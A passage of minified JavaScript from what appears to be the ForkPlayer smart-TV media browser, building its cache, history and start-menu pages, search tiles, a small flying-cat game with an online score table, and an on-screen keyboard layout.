data.channels.push({"title":el.n,"playlist_url":el.n,"logo_30x30":_img("_ST_history.png"),"description":"Нажмите для перехода по адресу<br>"+el.n})}}else if(n.indexOf("about:cache")==0){data={"title":"Кеш","channels":[]};var x=lIlI1VBOOlI01QYpr(maJor.read("prev_cache"));if(n.indexOf("#del")>0){n=String(n.split("#del")[0]);if(x[n.substr(14)]){delete x[n.substr(14)];maJor.write("prev_cache",l1OOl0I0IASY10lQ10Ypr(x));kjtYpr.inf("Удалено из кеша "+n.substr(14),1500);OpenUrl({"playlist_url":"about:cache","defaultSelect":getSelect()})}}
if(n=="about:cache"){for(var a in x){var el=x[a];data.channels.push({"title":el.settitle,"playlist_url":"about:cache://"+a,"logo_30x30":el.setimg,"description":"Дата помещения в кеш: "+dt(el.setcache,!0)+"<br>Размер: "+ToSize(l1OOl0I0IASY10lQ10Ypr(el).length),menu:[{"title":"Удалить","playlist_url":"about:cache://"+a+"#del"}]})}}else{data=x[n.substr(14)]}}else if(n=="about:history"){s=maJor.read("history");data=lIlI1VBOOlI01QYpr(s);var d=[];if(data==null){d.push({"title":"_FPZdesPusto_"})}else for(var i=0;i<data.length;i++){var dpu=null;if(typeof data[i].ch=="object"){var ch=data[i].ch;ch.menu=[{"title":"Страница "+data[i].title,"playlist_url":data[i].xml_url,"logo_30x30":data[i].icon}];var mtc=data[i].ch.stream_url.match(/\/\/(.*?)\//);if(mtc!=null)dpu=mtc[1];ch.display_title=ch.title+" / "+data[i].title}else{ch={"display_title":data[i].title,"playlist_url":data[i].xml_url,"logo_30x30":data[i].icon}}
if(dpu==null){var mtc=data[i].xml_url.match(/\/\/(.*?)\//);if(mtc!=null)dpu=mtc[1]}
if(dpu!=null)dpu="<div style='float:right;margin-right:27px;'>"+dpu+"</div>";else dpu="";ch.display_title=dt(data[i].time+(parseInt(maJor.params.get("JTVRegion"))+(T.timezoneoffset/60))*3600,1,0,1,1)+dpu+" <span style='white-space:normal;'>"+ch.display_title+"</span>";ch.title=data[i].title;ch.description="";d.push(ch)}
data={"options":"hidedescription","cacheinfo":"nocache","playlist_name":"_FPHistory_","channels":d}}
if(n=="getconfig"){var def={"config":{"ver":3,"best":3,"order":startL},"fav":[]};var ch=lIlI1VBOOlI01QYpr(maJor.read("glstart"));if(!ch)ch=def;if(!ch.config)ch.config=def.config;if(!ch.config.order||ch.config.ver<3){ch.config.order=def.config.order;ch.config.ver=3}
if(!ch.config.ver){try{ch.config.ver=def.config.ver;var x=0;for(var i in startL){if(startL[i]=="vilka_last")break;if(exinobj(ch.config.order,startL[i]))x++}
ch.config.order.splice(x,0,"vilka_last");ch.config.order.splice(x+1,0,"vilka_rek")}catch(e){jsshowErr("Error config order: "+e.message,2)}}
if(!ch.fav)ch.fav=def.fav;if(typeof ch.search=="undefined"){ch.search={"sites":[]};if(maJor.ipCountry!="UA")ch.search.sites.push({"logo":maJor.parsers.link()+"icons/play.png","type":"site","title":"VideoCDN.tv","dop":2,"url":maJor.parsers.link()+"http://videocdn.tv/?id=search&search=%s"});if(maJor.ipCountry=="UA")ch.search.sites.push({"logo":"http://parsers.appfxml.com/icons/youtube.png","type":"site","title":"YouTube","dop":1,"url":"http://parsers.appfxml.com/http://youtube.com/?id=search&search=%s"});else ch.search.sites.push({"logo":"http://parsers.appfxml.com/icons/rutube.png","type":"site","title":"Rutube","dop":1,"url":"http://parsers.appfxml.com/https://rutube.ru/?id=search&search=%s"});if(maJor.ipCountry!="UA"){if(maJor.app_cors)ch.search.sites.push({"logo":maJor.parsers.link()+"icons/rezka.png","type":"site","title":"Rezka","dop":1,"url":maJor.parsers.link()+"http://rezka.ag/?id=search&search=%s"})}}
if(typeof ch.search.system!="undefined"){for(var i=0;i<ch.search.system.length;i++){el=ch.search.system[i];if(el!=null){el.type="iframe";ch.search.sites.push(el)}}
delete ch.search.system}
if(typeof ch.search.ds!="undefined"&&typeof ch.search.sites[ch.search.ds]!="undefined"){ch.search.sites[ch.search.ds].dop=2;delete ch.search.ds}
for(var i=0;i<ch.search.sites.length;i++){if(ch.search.sites[i]==null){ch.search.sites.splice(i,1);i--}else if(typeof ch.search.sites[i].type=="undefined")ch.search.sites[i].type="site"}
return ch}
if(n=="start"||n=="about:blank"){var ch=getVars("getconfig");ch.service=[];if(maJor.build>=5.5)ch.service.push({"source":"service","title":"Local Files & Plugins","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"http://remotefo.rk/treeview?host=remotefo.rk/","description":"http://127.0.0.1/treeview"});else if(maJor.build>=5.1)ch.service.push({"source":"service","title":"Ace stream torrent plugins","logo_30x30":"_ST_ace_stream.png","playlist_url":"http://remotefo.rk/treeview?pluginacetorrentplay/.xml&host=remotefo.rk/","description":"forkplayer://pluginacetorrentplay/"});if(maJor.params.get("acestream")||maJor.params.get("acestreamactive"))ch.service.push({"source":"service","title":"Ace stream torrent","logo_30x30":"_ST_ace_stream.png","local":2,"mb_parser":"http://ACE_IP:6878/webui/api/service?method=get_version&format=jsonp&callback=mycallback","menu_url":"1080|remotefork|rfs","playlist_url":"http://parsers.appfxml.com/torrentsites/?as=md5mbhash","description":"http://parsers.appfxml.com/torrentsites/"});if(maJor.params.get("remote")>0){ch.service.push({"source":"service","title":"RemoteFork DLNA & Plugins","logo_30x30":"_ST_dlna.png","playlist_url":"forkdlna","description":"forkplayer://RemoteFork/"});ch.service.push({"source":"service","title":"Home media server","tvg-shift":"1","logo_30x30":"_ST_hms.png","playlist_url":"hms","description":"forkplayer://HMS/"})}
if(maJor.platform()=="tizen")ch.service.push({"source":"service","title":"USB","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"});else if(maJor.platform()=="maple"){ch.service.push({"source":"service","title":"USB<br>_FPPamyatTv_","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"});ch.service.push({"source":"service","title":"ForkStore<br> App Market","tvg-shift":"1","logo_30x30":"_ST_fstore.png","playlist_url":"http://obovse.ru/smarttv/wlist.php","description":"http://forkbrowser.top/forkstore"})}
ch.service.push({"source":"service","title":"Летящий Том","tvg-shift":"1","logo_30x30":"_ST_tomflight_logo.png?ndate230710_","playlist_url":"game://tomflight"});ch.service.push({"source":"service","title":"Блекджек","tvg-shift":"1","logo_30x30":"http://parsers.appfxml.com/icons/blackjack.jpg","playlist_url":"http://parsers.appfxml.com/blackjack/"});ch.service=delDupl(ch.fav,ch.service);if(typeof ch.hidetop=="object"){for(var i=0;i<ch.service.length;i++)if(ch.hidetop[gV(ch.service[i],"playlist_url")+""+gV(ch.service[i],"stream_url")]){ch.service.splice(i,1);i--}}
ch.omnibox=[];var k=getDefaultSE();if(!k.allse.length){var ot="_FPEnter_ URL _FPor Add search engine in settings_";var logo="none"}else if(k.allse.length==1){ot="_FPEnter URL or search on_ "+k.allse[0]+" _FPor Add search engine in settings_";logo=k.logo}else{logo="";ot="_FPEnter URL or search on_ "+k.allse.join(", ")+""}
ch.omnibox.push({"source":"spider","style":"text-align: center;width: 80%;margin: 10px 10% 0px 10%;border-radius:12px;","title":ot,"position":"html","value":"","search_on":"_FPEnter search query or URL_:","logo_30x30":logo,"playlist_url":"searchEngines","presearch":"http://spider.appfxml.com/omnibox/?type=all",template:'<div style="margin: 3px; height: 37px; background-color: #1f2a44; border: 1px solid #2e3a54; font-family: Arial, Helvetica, sans-serif; color: #adadad; border-radius: 12px; padding: 0 2px 0 37px; position: relative;text-align: left;overflow: hidden;">  <img src="$logo_30x30" style="width: 20px; height: 20px; position: absolute; top: 8px;  left: 10px;">  <span style=" font-size: 15px; line-height: 37px;">$title</span></div>','logo_30x30':_img("_ST_lucide_search.png")});ch.spider=[];ch.spider.push({source:"spider",title:"SpiderXml",description:"_FPPlaylist Search Engine_",position:"tile",logo:'<svg style="width: 24px; height: 24px; vertical-align: middle;" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--noto" preserveAspectRatio="xMidYMid meet" fill="#000000"><g stroke-width="0"></g><g stroke-linecap="round" stroke-linejoin="round"></g><g><path d="M94.9 71.35c-8.08-7.63-21.82-13.99-30.91-18.2c-1.54-.71-2.93-1.35-4.11-1.92c-3.43-1.65-8.12-6.22-6.1-11.47c1.36-3.55 4.81-5.34 10.27-5.34c1.75 0 3.67.2 5.72.58c7.12 1.33 12.52 3.99 15.58 5.5c.38.19.82.21 1.22.07c.39-.15.72-.45.89-.84l7.01-15.81c.31-.69.07-1.51-.57-1.93c-4.94-3.28-17.27-8.15-30.97-8.15c-1.98 0-3.95.1-5.87.3c-10.92 1.12-21.86 4.03-27.92 17.64c-3.78 8.47-3.77 18.01.01 24.89c4.04 7.51 10.66 10.87 19.04 15.11l1.08.55c6.05 3.02 13.3 6.38 18.07 8.59c7.05 3.4 9.66 9.44 8.04 13.08c-2.61 5.87-8.38 7.16-18.36 4.33c-8.81-2.39-16.94-9.14-19.21-11.15c-.34-.3-.79-.44-1.25-.38c-.45.06-.85.32-1.1.69L24.6 104.14c-.41.63-.32 1.46.22 1.98c5.63 5.43 10.22 8.59 18.17 12.5c5.35 2.63 13.18 4.21 20.95 4.21c8.12 0 27.95-1.88 36.65-19.26c5.55-11.12 3.48-22.84-5.69-32.22z" fill="currentColor"></path></g></svg>',playlist_url:"http://spider.appfxml.com"});ch.spider.push({source:"spider",title:"_FPMovie parsers_",description:"VilkaDB, HDRezka _FPand other portals_",position:"tile",logo:'<svg style="width: 24px; height: 24px; vertical-align: middle;" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g stroke-width="0"></g><g stroke-linecap="round" stroke-linejoin="round"></g><g> <path fill-rule="evenodd" clip-rule="evenodd" d="M15.3276 7.54199H8.67239C5.29758 7.54199 3.61017 7.54199 2.66232 8.52882C1.71447 9.51565 1.93748 11.0403 2.38351 14.0895L2.80648 16.9811C3.15626 19.3723 3.33115 20.5679 4.22834 21.2839C5.12553 21.9999 6.4488 21.9999 9.09534 21.9999H14.9046C17.5512 21.9999 18.8745 21.9999 19.7717 21.2839C20.6689 20.5679 20.8437 19.3723 21.1935 16.9811L21.6165 14.0895C22.0625 11.0403 22.2855 9.51564 21.3377 8.52882C20.3898 7.54199 18.7024 7.54199 15.3276 7.54199ZM14.5812 15.7942C15.1396 15.448 15.1396 14.5519 14.5812 14.2057L11.2096 12.1156C10.6669 11.7792 10 12.2171 10 12.9098V17.0901C10 17.7828 10.6669 18.2207 11.2096 17.8843L14.5812 15.7942Z" fill="currentColor"></path> <path opacity="0.4" d="M8.50956 2.00001H15.4897C15.7221 1.99995 15.9004 1.99991 16.0562 2.01515C17.164 2.12352 18.0708 2.78958 18.4553 3.68678H5.54395C5.92846 2.78958 6.83521 2.12352 7.94303 2.01515C8.09884 1.99991 8.27708 1.99995 8.50956 2.00001Z" fill="currentColor"></path> <path opacity="0.7" d="M6.3102 4.72266C4.91958 4.72266 3.77931 5.56241 3.39878 6.67645C3.39085 6.69967 3.38325 6.72302 3.37598 6.74647C3.77413 6.6259 4.18849 6.54713 4.60796 6.49336C5.68833 6.35485 7.05367 6.35492 8.6397 6.35501H15.5318C17.1178 6.35492 18.4832 6.35485 19.5635 6.49336C19.983 6.54713 20.3974 6.6259 20.7955 6.74647C20.7883 6.72302 20.7806 6.69967 20.7727 6.67645C20.3922 5.56241 19.2519 4.72266 17.8613 4.72266H6.3102Z" fill="currentColor"></path> </g></svg>',playlist_url:"http://fxmlparsers.in.net/",playlist_url2:"http://p3.fxmlparsers.in.net/"});ch.spider.push({source:"spider",title:"_FPOnline parsers_",description:"Twitch, OK, zf.fm, RuTube, YouTube,...",position:"tile",logo:'<svg style="width: 24px; height: 24px; vertical-align: middle;" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g stroke-width="0"></g><g stroke-linecap="round" stroke-linejoin="round"></g><g> <path fill-rule="evenodd" clip-rule="evenodd" d="M15.3276 7.54199H8.67239C5.29758 7.54199 3.61017 7.54199 2.66232 8.52882C1.71447 9.51565 1.93748 11.0403 2.38351 14.0895L2.80648 16.9811C3.15626 19.3723 3.33115 20.5679 4.22834 21.2839C5.12553 21.9999 6.4488 21.9999 9.09534 21.9999H14.9046C17.5512 21.9999 18.8745 21.9999 19.7717 21.2839C20.6689 20.5679 20.8437 19.3723 21.1935 16.9811L21.6165 14.0895C22.0625 11.0403 22.2855 9.51564 21.3377 8.52882C20.3898 7.54199 18.7024 7.54199 15.3276 7.54199ZM14.5812 15.7942C15.1396 15.448 15.1396 14.5519 14.5812 14.2057L11.2096 12.1156C10.6669 11.7792 10 12.2171 10 12.9098V17.0901C10 17.7828 10.6669 18.2207 11.2096 17.8843L14.5812 15.7942Z" fill="currentColor"></path> <path opacity="0.4" d="M8.50956 2.00001H15.4897C15.7221 1.99995 15.9004 1.99991 16.0562 2.01515C17.164 2.12352 18.0708 2.78958 18.4553 3.68678H5.54395C5.92846 2.78958 6.83521 2.12352 7.94303 2.01515C8.09884 1.99991 8.27708 1.99995 8.50956 2.00001Z" fill="currentColor"></path> <path opacity="0.7" d="M6.3102 4.72266C4.91958 4.72266 3.77931 5.56241 3.39878 6.67645C3.39085 6.69967 3.38325 6.72302 3.37598 6.74647C3.77413 6.6259 4.18849 6.54713 4.60796 6.49336C5.68833 6.35485 7.05367 6.35492 8.6397 6.35501H15.5318C17.1178 6.35492 18.4832 6.35485 19.5635 6.49336C19.983 6.54713 20.3974 6.6259 20.7955 6.74647C20.7883 6.72302 20.7806 6.69967 20.7727 6.67645C20.3922 5.56241 19.2519 4.72266 17.8613 4.72266H6.3102Z" fill="currentColor"></path> </g></svg>',playlist_url:"http://parsers.appfxml.com/",playlist_url2:"http://parsers2.appfxml.com/",});ch.spider.push({source:"spider",title:"_FPCustomize search_",description:"_FPMy Search Engines_",position:"tile",logo:'<svg xmlns="http://www.w3.org/2000/svg" style="width: 24px; height: 24px; vertical-align: middle;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.3-4.3"></path></svg>',playlist_url:"about:configsearch"});if(maJor.user)
ch.spider.push({source:"spider",title:"_FPProfile_",description:(gV(maJor.user,"login")!=gV(maJor.user,"email")?gV(maJor.user,"login"):"")||maJor.user.email,position:"tile",logo:'<svg xmlns="http://www.w3.org/2000/svg" style="width: 24px; height: 24px; vertical-align: middle;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>',playlist_url:"http://cloudflare.appfxml.com/browseraccount/"});else ch.spider.push({"source":"spider","title":"_FPCreate a Fork Profile_",position:"tile","logo_30x30":maJor.addident("http://cloudflare.appfxml.com/browseraccount/?do=enterqr"),"playlist_url":"http://cloudflare.appfxml.com/browseraccount/"});ch.spider.push({source:"spider",title:"_FPZakladki_",description:"_FPView history_",position:"tile",logo:'<svg viewBox="0 0 24 24" style="width: 24px; height: 24px; vertical-align: middle;"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" fill="currentColor"/></svg>',playlist_url:"about:favorites"});ch.spider.push({source:"spider",title:"_FPSettings_",description:"_FPConfiguration, background, appearance_",position:"tile",logo:'<svg xmlns="http://www.w3.org/2000/svg" style="width: 24px; height: 24px; vertical-align: middle;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"></path><circle cx="12" cy="12" r="3"></circle></svg>',playlist_url:"about:settings"});ch.top=getTop(ch);getLastRek(ch);ch.channels=[];maJor.each(ch.config.order,function(val){var kk=0;maJor.each(ch[val],function(val2,i2){if(gVs(val).match(/vilka/))var maxX=9;else maxX=7;if(val2){val2.id=i2;if(i2==0){kk=0;val2.br=1;if(val!="omnibox")val2.before='<div style="height: 30px; line-height: 20px; vertical-align: middle;  font-family: Arial, Helvetica, sans-serif;  margin: 15px 0px 5px 0px;">'+'<div style="float: left; vertical-align: middle;height: 30px;width:30px;overflow: hidden;">'+gV(startTLogo,val)+'</div>'+'<span style="vertical-align: middle; font-size: 20px; font-weight: bold;">'+gV(startT,val)+'</span>'+'</div>'}else if(val2.br){kk=0}else{val2.br=0;kk++;val2.before=""}
if(kk==maxX){val2.br=1;kk=0}
if(val=="fav"){if(maJor.params.get('tileurl'))val2.description=val2.playlist_url||val2.stream_url;else val2.description="";if(val2.description=="submenu"){if(val2.submenu)val2.description="["+(gV(val2.submenu[0],"infolink")||(gV(val2.submenu[0],"playlist_url")+gV(val2.submenu[0],"stream_url")))+",...]";else val2.description=""}
var domen=val2.description.match(/^https?:\/\/([^\/]+)/);val2.description=domen?domen[1]:""}
val2.source=val;ch.channels.push(val2)}});if(val=="fav"){val2={"source":"addfav","title":"<b>_FPAdd shortcut_</b>","logo":'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor" style="max-width: 50px;"><path d="M440-120v-320H120v-80h320v-320h80v320h320v80H520v320h-80Z"/></svg>',"playlist_url":"about:addstartlink"};if(ch.fav.length==0){kk=0;val2.br=1;val2.before='<div style="height: 30px; line-height: 20px; vertical-align: middle;  font-family: Arial, Helvetica, sans-serif;  margin: 15px 0px 5px 0px;">'+'<div style="float: left; vertical-align: middle;height: 30px;width:30px;overflow: hidden;">'+gV(startTLogo,val)+'</div>'+'<span style="vertical-align: middle; font-size: 20px; font-weight: bold;">'+gV(startT,val)+'</span>'+'</div>'}else kk++;if(kk==7){val2.br=1;kk=0}
ch.channels.push(val2)}});ch.title="_FPDobroPozhalovat_";ch.icon="none";ch.align="left";ch.typeList="start";ch.css="#content{width: 95%;margin-left: 5%;} .description{visibility:hidden;}";ch.navigate="_FPStartovoeMenu_";for(var i=0;i<ch.channels.length;i++){for(var j in ch.channels[i]){if(gV(ch[i],j)=="undefined")ch.channels[i][j]=""}
if(!gVs(ch.channels[i],"source").match(/spider|omnibox|vilka/))ch.channels[i].position="tile";if(gVs(ch.channels[i],"source").match(/fav/))ch.channels[i].position="tile2"}
data=ch}
return data}
function OeInit(f,n){var b=Inset.create();b.init(n);return b}
function getFon(u){if(u==-1)u="";else if(!u)u=_img("_ST_fon/fon30.png");else if(u=="jpg"||u=="png"){u=maJor.addident("http://cloudflare.appfxml.com/browseraccount/?do=fon&ext="+u)}else if(String(u).indexOf("http")!=0)u=_img("_ST_fon/fon30.png");return u}
var curPage=FXMLPage.create();function wheel(c){return Il01QllQll().wheel(c)}
function cleanCh(ch,nodesc){var obj={};for(var key in ch){if(gV(ch,key)!==""&&key.toString().match(/^(title|logo|stream_url|playlist_url|search_on|parser|description|tvg-|group|catchup|search_on)/)){if(gP("is_iptv")>2&&key=="description"){ch[key]=""}
if((key==="title"||(key==="description")&&nodesc)&&ch[key]){ch[key]=trim2(String(ch[key]).replace(/<.*?>/g," "))}
if(ch[key]!==""){obj[key]=ch[key]}}}
return obj}
function onImgError(t,m){t.onerror=null;if(m==null||m=="err"){t.src=icoerr}else if(m=="emptydoc"){t.src=_img("_ST_emptydoc.png")}else if(m=="ico_edit"){t.src=ico_edit}}
if(!document.attachEvent){document.addEventListener('visibilitychange',function(){if(document.hidden){}else{fEpg.load();uHelper.create("direct").updateCurl();maJor.Remote.init();maJor.updateWeather()}},!0);window.addEventListener("resize",function(){});window.addEventListener('beforeunload',function(){maJor.synced()});window.addEventListener("mousemove",function(){screensavertimer=-1})}
function addHandler(object,event,handler,useCapture){if(object.addEventListener){object.addEventListener(event,handler,useCapture?useCapture:!1)}else if(object.attachEvent){object.attachEvent('on'+event,handler)}else{}}
addHandler(window,'DOMMouseScroll',wheel);addHandler(window,'mousewheel',wheel,{passive:!1});var tomflight_init=!1;function tomflight(){tscreen="game";if(!tomflight_init){var div=document.createElement('div');div.id="game";div.style.top="0px";div.style.left="0px";div.style.width="1280px";div.style.height="720px";div.style.overflow="hidden";div.style.display="none";div.style.padding="0px";div.style.backgroundColor="black";div.style.position="absolute";div.style.zIndex="0";div.onclick=tomflight_click;$_("main").appendChild(div);tomflight_init=!0}
$_("game").style.display="block";$_("game").style.zIndex="1";$_("game","<div style='padding:0px 20px;height:30px;width:1240px;'><div id='gfps' style='position:absolute;left:200px;'></div><div id='gallrel' style='position:absolute;left:450px;'></div><div id='gtop' style='float:left;'></div><div id='gfirst' style='float:right;'></div></div>"+"<div id='gmain' style='height:690px;width:1280px;'></div>"+"<div id='gbottom'></div>");tomflight_start()}
var tomflight_f=!1,tomflight_i,tomflight_fi,tomflight_c,t_x=0,t_c=0,t_t=0,t_arr=[],t_xnum=0,t_rec=0,t_fps=0,fps=0,t_glrek="";var glevel=1,gwidth=16000,ltx=0,mv=0;function tomflight_start(){t_x=0;t_c=250;t_xnum=0;t_t=0;t_fps=0;fps=0;ltx=0;mv=0;glevel=1;var s=maJor.read("rt");if(s>0)t_rec=s;else t_rec=0;t_arr=[],tomflight_f=!1;clearInterval(tomflight_i);clearInterval(tomflight_fi);uHelper.create("directnoheader").hid().getI("http://exec.remotecurl.appfxml.com/os/api.php?do=tomflight&fps=0&n=0").parse=function(s){t_glrek=gV(s);s=t_glrek.split("<br>");$_("gallrel",s[2]+", "+String(s[1]).substring(0,32)+":"+s[0].split(":")[1])};$_("gfirst","Рекорд: "+t_rec);$_("gmain","<div id='gtowers' style=\"position:absolute;top:30px;left:"+t_x+"px;height:100%;width:"+gwidth+"px;background:url("+_img("_ST_tomflight/tomflight_fon.jpg")+");\"></div>"+"<div id='gcat' style='position:absolute;top:"+t_c+"px;left:150px;height:48px;width:64px;background-color:gray;background:url("+_img("_ST_tomflight/tom.png")+");'></div>");tomflight_tower(t_x);tomflight_i=setInterval("tomflight_render();",40);tomflight_fi=setInterval(function(){if(tomflight_f){clearInterval(tomflight_fi);return}
fps=(t_fps/2).toFixed(1);mv=-1*((t_x-ltx)/2).toFixed(1);t_fps=0;ltx=t_x;$_("gfps","FPS: "+fps)},2000)}
function tomflight_render(){if(tomflight_f||handler=="vk")return;var ind=1;if(fps>2&&t_x<-150&&mv>15){if(fps>2)ind=24/fps;else ind=24/3}
ind=ind+((glevel-1)/10)*ind;t_x-=Math.ceil(7*ind);t_t++;t_fps++;t_c+=Math.ceil(1+(t_t/3.5))*ind;if(t_x*-1>gwidth){tomflight_tower();glevel++;t_x=0;kjtYpr.popUp("Уровень: "+glevel)}
$_("gcat").style.top=t_c+"px";$_("gtowers").style.left=t_x+"px";tomflight_isset()}
function tomflight_down(){if(tomflight_f)return;t_c+=75;$_("gcat").style.backgroundPosition="0px 48px";$_("gcat").style.top=t_c+"px";setTimeout('$_("gcat").style.backgroundPosition="0px 0px";',120);tomflight_isset()}
function tomflight_click(m,k,n){if(tomflight_f)return;if(n==null){t_c-=55;$_("gcat").style.backgroundPosition="0px 96px";n=0;clearTimeout(tomflight_c)}else t_c-=10;t_t=0;$_("gcat").style.top=t_c+"px";if(n<2)tomflight_c=setTimeout("tomflight_click(null,null,"+(n+1)+");",30);else setTimeout('$_("gcat").style.backgroundPosition="0px 0px";',100);tomflight_isset()}
function tomflight_tower(x){var s="",i=2,l=0,ls=0,dm=120;t_arr=[];while(l+400<gwidth){var r=Math.ceil(80+340*Math.random());if(ls>0){if(ls-r>dm)r=ls-dm;else if(r-ls>dm)r=ls+dm}
var l=i*400;t_arr.push([l,r]);s+="<div style='position:absolute;top:0px;left:"+l+"px;height:"+r+"px;width:130px;background:url("+_img("_ST_tomflight/tomfligh_t_down.png")+");background-position:0px "+r+"px;'></div>"+"<div style='position:absolute;top:"+(r+150)+"px;left:"+l+"px;height:"+(690-r-150)+"px;width:130px;background:url("+_img("_ST_tomflight/tomfligh_t_up.png")+");'></div>";i++;ls=r}
$_("gtowers",s)}
var last=-1;function tomflight_isset(){var x=150-t_x;for(var i=0;i<t_arr.length;i++){if(x+62>t_arr[i][0]&&x<130+t_arr[i][0]){if(x>t_arr[i][0]+60){t_xnum=(glevel-1)*t_arr.length+i+1}
s=" INTO "+t_c+" "+t_arr[i][1];if(t_c-27<t_arr[i][1]||t_c>t_arr[i][1]+140){tomflight_fail()}}}
if(t_c>800&&!tomflight_f)tomflight_fail();if(last!=t_xnum)$_("gtop","Счет: "+t_xnum);last=t_xnum}
function tomflight_conf(text){setTimeout(function(){confirmed.create(text+"<br>Счет: "+t_xnum+"<br>","Tom Flite","_FPZakrit_|_FPNachatZanovo_").fun=[function(){tscreen="main";$_("game").style.display="none";$_("game").style.zIndex="0"},function(){tomflight_start()}]},80)}
var tomflight_fail=function(){if(tomflight_f)return;tomflight_f=!0;clearInterval(tomflight_fi);clearInterval(tomflight_i);clearTimeout(tomflight_c);setTimeout(function(){if(t_xnum){uHelper.create("directnoheader").hid().getI("http://exec.remotecurl.appfxml.com/os/api.php?do=tomflight&fps="+fps+"&n="+t_xnum).parse=function(s){t_glrek=gV(s);s=t_glrek.split("<br>");$_("gallrel",s[2]+" "+String(s[1]).substring(0,32)+":"+s[0].split(":")[1]);if(s[3]=="new"){confirmed.close();VK.open({title:"_FPWeek record! Enter your nickname_",value:gV(maJor.user,"login"),oncomplete:function(c){if(c.str=='')return;maJor.write("tfn",c.str);uHelper.create("directnoheader").hid().getI("http://exec.remotecurl.appfxml.com/os/api.php?do=tomflight&setname="+c.str);tomflight_conf("Новый рекорд!");return 1}});$_("game").style.zIndex="0"}}}
if(t_xnum>t_rec){t_rec=t_xnum;maJor.write("rt",t_xnum);s="";tomflight_conf("Новый рекорд!")}else tomflight_conf("Вы проиграли!")},1000)}
var VK={pos:[2,7],last:[0,0],last2:[0,0],shift:0,req_id:0,qSelect:-1,select:-1,quicks:[],hS:{},Keyboard:null,UrlSearch:null,focus:null,Kir0:[[["1","!"],["2",'"'],["3","\u2116"],["4",";"],["5","%"],["6",":"],["7","?"],["8","*"],["9","("],["0",")"],["_ST_copy.png"],["_ST_paste.png"],["_ST_clear.png"],["_ST_backspace.png"],["_ST_return.png"]],[["\u0439","\u0419"],["\u0446","\u0426"],["\u0443","\u0423"],["\u043A","\u041A"],["\u0435","\u0415"],["\u043D","\u041D"],["\u0433","\u0413"],["\u0448","\u0428"],["\u0449","\u0429"],["\u0437","\u0417"],["\u0445","\u0425"],["\u044A","/"],["@","-"],[":","_"],["_ST_international.png"]],[["ф","Ф"],["\u044B","І"],["\u0432","\u0412"],["\u0430","\u0410"],["\u043F","\u041F"],["\u0440","\u0420"],["\u043E","\u041E"],["\u043B","\u041B"],["\u0434","\u0414"],["\u0436","\u0416"],["\u044D","є"],["і","ї"],["+","\u0401"]],[["\u044F","\u042F"],["\u0447","\u0427"],["\u0441","\u0421"],["\u043C","\u041C"],["\u0438","\u0418"],["\u0442","\u0422"],["\u044C","\u042C"],["\u0431","\u0411"],["\u044E","\u042E"],[".",","],["_ST_left.png"],["_ST_right.png"],["_ST_space.png","_ST_space.png"],["_ST_shift.png"]],],US:[[["q","Q"],["w","W"],["e","E"],["r","R"],["t","T"],["y","Y"],["u","U"],["i","I"],["o","O"],["p","P"],["[","]"],["_ST_return.png"]],[["a","A"],["s","S"],["d","D"],["f","F"],["g","G"],["h","H"],["j","J"],["k","K"],["l","L"],[":",";"],["|","\\"],["-","_"]],[["z","Z"],["x","X"],["c","C"],["v","V"],["b","B"],["n","N"],["m","M"],[",","<"],[".",">"],["/","?"],["@","`"],["http://","https://"]],[["_ST_shift.png"],["1","!"],["2","@"],["3","#"],["4","$"],["5","%"],["6","^"],["7","&"],["8","*"],["9","("],["0",")"],["_ST_backspace.png"]],[["_ST_copy.png"],["_ST_paste.png"],["_ST_clear.png"],["_ST_left.png"],["_ST_right.png"],["_ST_space.png"],["_ST_international.png"],["_ST_enter.png"]]],Kir:[[["й","Й"],["ц","Ц"],["у","У"],["к","К"],["е","Е"],["н","Н"],["г","Г"],["ш","Ш"],["щ","Щ"],["з","З"],["х","Х"],["_ST_return.png"]],[["ф","Ф"],["ы","Ы"],["в","В"],["а","А"],["п","П"],["р","Р"],["о","О"],["л","Л"],["д","Д"],["ж","Ж"],["э","Э"],["і","І"]],[["я","Я"],["ч","Ч"],["с","С"],["м","М"],["и","И"],["т","Т"],["ь","Ь"],["б","Б"],["ю","Ю"],["ё","Ё"],["ї","Ї"],["-","_"]],[["_ST_shift.png"],["1","!"],["2","@"],["3","#"],["4","$"],["5","%"],["6","^"],["7","&"],["8","*"],["9","("],["0",")"],["_ST_backspace.png"]],[["_ST_copy.png"],["_ST_paste.png"],["_ST_clear.png"],["_ST_left.png"],["_ST_right.png"],["_ST_space.png"],